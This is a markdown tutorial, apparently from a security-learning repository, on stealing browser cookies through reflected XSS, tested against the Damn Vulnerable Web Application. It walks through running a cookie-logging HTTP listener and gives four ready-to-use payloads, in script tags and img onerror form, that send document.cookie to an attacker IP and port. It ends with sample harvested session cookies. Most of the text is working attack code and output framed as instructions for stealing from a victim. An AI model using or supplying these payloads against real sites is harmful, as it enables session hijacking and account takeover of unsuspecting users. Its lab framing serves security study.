# Steal Cookies with Reflected XSS

This is a basic Reflected XSS attack to steal cookies from a user of a vulnerable website. The attack string comes from Ch. 12, p. 436 of [The Web Application Hacker's Handbook, 2nd Ed.][3]

This was tested against the [Damn Vulnerable Web Application][5] (DVWA) v1.8. DVWA can be installed alone or as part of the excellent [OWASP Broken Web Applications Project][6] (BWA) v1.2.



### Assumptions:
1. You've already identified website (and field or parameter) that is vulnerable to Reflected XSS.
1. You're able to run shell commands on a Linux system that is reachable by the vulnerable web app. You'll probably need to run the Python script (mentioned below) as root or prepended with `sudo`.

## Run the Cookie Stealer Python Script

You'll need a place to capture the stolen cookies. [lnxg33k][1] has written an excellent Python script called [XSS-cookie-stealer.py][2]. Run it with Python 2.6 or higher. It is just an HTTP server which logs each inbound HTTP connection and all the cookies contained in that connection.

```shell
python XSS-cookie-stealer.py
```

The resulting output, at minimum, will be this:

```shell
Started http server

```

You're not there yet. Now you have to launch the actual attack. Below are a couple of choices.

## Inject the XSS Attack Code
Below are four versions of the same attack.

### 1. `alert()` Before Stealing the Cookie
Run this version of the attack code if you want to see the cookie in a JS `alert()` as confirmation that the injection is successfully exploiting the vulnerability on the target site. Note that the cookie will not upload to your Python listener until the victim closes the JS `alert()` dialog.

```javascript
<script>
alert(document.cookie);
var i=new Image;
i.src="http://192.168.0.18:8888/?"+document.cookie;
</script>
```

### 2. Silent One-Liner
This one is the same but no `alert()` and all on one line.

```js
<script>var i=new Image;i.src="http://192.168.0.18:8888/?"+document.cookie;</script>
```

### 3. `<img>` Tag Instead of `<script>` Tags
Don't use this one! It works but calls `onerror()` in a loop, filling up your stolen cookie log:
```html
<img src=x onerror=this.src='http://192.168.0.18:8888/?'+document.cookie;>
```

### 4. `<img>` Tag and Without the Infinite Loop
This one works and will only steal the cookie once. I adapted it from a posting on the old [kirupa.com][4] forum.
```html
<img src=x onerror="this.src='http://192.168.0.18:8888/?'+document.cookie; this.removeAttribute('onerror');">
```

## Harvest the Stolen Cookies
If you successfully get inject your cookie-stealing XSS script into a vulnerable website, and the script is subsequently executed in a victim's browser, you'll see a cookie appear in the STDOUT of the shell running the Python script:

```shell
2017-02-09 10:05 PM - 192.168.0.254	Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0
------------------------------------------------------------------------------------------------------------------
Cookie Name			Value
------------------------------------------------------------------------------------------------------------------
acopendivids			['swingset,jotto,phpbb2,redmine']
security			['low']
acgroupswithpersist			['nada']
PHPSESSID			['93l9ahf1120bkp79t5ehbkc0m4']
```


[1]: https://github.com/lnxg33k
[2]: https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py
[3]: http://www.wiley.com/WileyCDA/WileyTitle/productCd-1118026470.html
[4]: https://www.kirupa.com/forum/showthread.php?377664-onerror-within-the-img-tag
[5]: http://www.dvwa.co.uk/
[6]: http://www.owaspbwa.org/
